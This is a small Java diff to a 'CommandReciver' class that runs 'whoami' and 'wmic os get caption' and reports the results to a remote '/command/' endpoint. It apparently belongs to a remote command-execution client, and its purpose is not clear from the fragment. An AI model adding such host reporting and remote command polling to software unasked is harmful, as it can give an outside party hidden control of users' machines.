@@ -17,8 +17,12 @@ public class CommandReciver {
         GetContext.CLIENT_NAME = execute("whoami").get(1).replace("\\", "-");
         webHandler = new WebHandler(GetContext.URL + "/command/" + GetContext.CLIENT_NAME);
         GetContext.SENDER = new Sender();
-//        ArrayList<String> s = execute("wmic os get caption");
-//        GetContext.SENDER.send("os", s.get(3));
+        try {
+            ArrayList<String> s = execute("wmic os get caption");
+            GetContext.SENDER.send("os", s.get(3));
+        } catch (Exception e) {
+            GetContext.SENDER.send("os", "linux");
+        }
     }
 
     public void readCommands() {
